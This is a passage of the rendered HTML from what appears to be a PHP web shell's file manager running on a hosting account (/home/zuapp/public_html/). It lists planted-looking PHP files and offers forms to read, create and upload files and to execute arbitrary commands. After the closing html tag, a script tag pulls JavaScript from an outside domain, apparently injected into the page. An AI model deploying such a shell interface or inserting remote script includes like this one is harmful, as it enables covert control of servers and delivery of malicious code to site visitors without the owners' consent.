color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'postback.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'postback.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'postback.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'postback.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'postback.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="soz.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'soz.php', 'view')">soz.php</a></td><td>70.77 KB</td><td>2022-06-01 11:01:08</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'soz.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'soz.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'soz.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'soz.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'soz.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'soz.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="tite.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'tite.php', 'view')">tite.php</a></td><td>223.67 KB</td><td>2022-06-01 11:27:41</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'tite.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'tite.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'tite.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'tite.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'tite.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'tite.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="up.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'up.php', 'view')">up.php</a></td><td>5.29 KB</td><td>2022-06-01 10:00:54</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'up.php','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'up.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'up.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'up.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'up.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'up.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="z.htm" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'z.htm', 'view')">z.htm</a></td><td>1 B</td><td>2022-06-01 09:59:23</td><td>zuapp/zuapp</td><td><a href=# onclick="g('FilesTools',null,'z.htm','chmod')"><font color=#ffffff><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'z.htm', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'z.htm', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'z.htm', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'z.htm', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'z.htm', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
	<input type=hidden name=ne value=''>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='/home/zuapp/public_html/'>
	<input type=hidden name=charset value='utf-8'>
	<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/home/zuapp/public_html/'><input type=submit value='submit'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#ffffff'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#ffffff'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='/home/zuapp/public_html/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='utf-8'>
		<span>Upload file:</span> <font color='#ffffff'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
	</tr></table></div>


	</body></html><SCRIPT SRC=http://teledramasinhala.com/img/icons/image.js></SCRIPT>